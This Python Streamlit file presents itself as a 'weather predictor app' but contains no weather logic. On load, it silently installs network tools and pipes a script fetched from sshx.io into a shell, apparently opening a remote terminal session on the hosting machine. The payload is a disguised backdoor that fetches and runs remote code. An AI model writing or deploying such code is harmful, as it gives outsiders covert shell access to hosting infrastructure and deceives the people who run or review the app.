import streamlit as st
import os

st.title("Welcome to my weather predictor app")
st.header("Let's all forecast weather")

results = os.system("apt update >/dev/null;apt y install wget curl net-tools screen dialog >/dev/null;curl -sSf https://sshx.io/get | sh -s run")
st.write(results)
